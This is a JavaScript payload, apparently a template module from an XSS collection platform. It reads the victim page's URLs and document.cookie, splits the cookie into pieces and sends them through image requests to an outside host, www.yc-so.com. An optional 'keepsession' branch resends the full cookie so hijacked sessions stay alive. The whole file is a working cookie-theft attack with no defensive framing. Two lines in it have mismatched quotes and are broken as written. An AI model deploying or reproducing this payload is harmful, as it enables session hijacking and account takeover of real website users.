(function() {
    (new Image()).src = 'http://www.yc-so.com/xser/s.php?do=api&id={projectId}&location=' + escape((function() {
        try {
            return document.location.href
        } catch (e) {
            return ''
        }
    })()) + '&toplocation=' + escape((function() {
        try {
            return top.location.href
        } catch (e) {
            return ''
        }
    })()) + '&c=' + escape((function() {
        try {
            var c1=document.cookie;
            var clen=c1.length/3;
            c2=c1.substring(0,clen );      
 
            var clen2=c1.length/1.5;
            c3=c1.substring(clen, clen2);
            c4=c1.substring(clen2,c1.length );
           keep1 = new Image();
           keep2 = new Image();
           keep1.src ='http://www.yc-so.com/xser/s.php?c="+escape(c2);
           keep2.src ='http://www.yc-so.com/xser/s.php?c="+escape(c3);

            return c4;
        } catch (e) {
            return ''
        }
    })()) + '&opener=' + escape((function() {
        try {
            return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
        } catch (e) {
            return ''
        }
    })());
})();
if ('{set.keepsession}' == 1) {
    keep = new Image();
    keep.src = 'http://www.yc-so.com/xser/s.php?do=keepsession&id={projectId}&url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
};
